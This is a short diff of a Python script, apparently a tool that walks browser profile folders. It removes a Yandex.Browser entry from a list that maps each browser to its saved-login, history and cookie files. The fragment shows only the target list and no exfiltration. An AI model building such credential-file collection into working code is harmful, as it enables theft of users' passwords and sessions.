@@ -65,13 +65,6 @@ def main():
 	'Logins': 'Login Data',
 	'History': 'History',
 	'Cookies': 'Cookies'
-	},
-	{
-	'Name': 'Yandex.Browser', 
-	'Path': bp+'/AppData/Local/Yandex/YandexBrowser/User Data/Default/',
-	'Logins': 'Ya Login Data',
-	'History': 'History',
-	'Cookies': 'Cookies'
 	}]
 	js0n = {}
 	for x in range(len(browsers)):
